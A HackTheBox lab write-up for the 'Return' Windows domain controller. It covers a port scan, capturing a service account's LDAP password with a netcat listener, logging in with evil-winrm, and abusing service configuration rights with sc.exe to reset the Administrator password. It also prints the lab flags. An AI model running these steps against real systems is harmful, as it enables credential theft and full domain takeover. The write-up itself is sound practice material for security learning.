---
title: "Return"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Return

![](assets/Pasted%20image%2020250510161818.png)
<!-- more -->

## Enumeration

```bash
$ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.108
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-25 20:06 CET
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.21% done; ETC: 20:06 (0:00:09 remaining)
Nmap scan report for 10.10.11.108
Host is up (0.041s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-25 19:25:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-25T19:26:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 18m34s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.55 seconds

```

We have a web config portal on `port 80`.

![](assets/Pasted%20image%2020241125221218.png)

So if we start a listener on `389` and send the request:

```bash
$ nc -lnvp 389
listening on [any] 389 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 63830
0*`%return\svc-printer�
                       1edFg43012!!

```

We have `svc-printer:1edFg43012!!`.

## Initial Access

Enter via `evil-winrm`.

```bash
$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ls
```

Get the flag:

```shell
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
d7dc8d0ca7c34ad11ee6758818d05458
```

## Privilege Escalation

We have a lot of privileges, so:

```bash
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

We can use the Service Operators group and manipulate a service. Use the `services` command to list them and try one, then set the `binpath` to change the `Administrator` password:

```bash
*Evil-WinRM* PS C:\> sc.exe config VMTools binPath="C:\Windows\System32\cmd.exe /c net user Administrator Buenas123#"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\> sc.exe stop VMTools
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\> sc.exe start VMTools
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

```bash
$ evil-winrm -i 10.10.11.108 -u Administrator -p Buenas123#
                                        
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## Post Exploitation

Get the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop>type root.txt
48acc7cefd2263b5dad91838bbf0bc8d
```
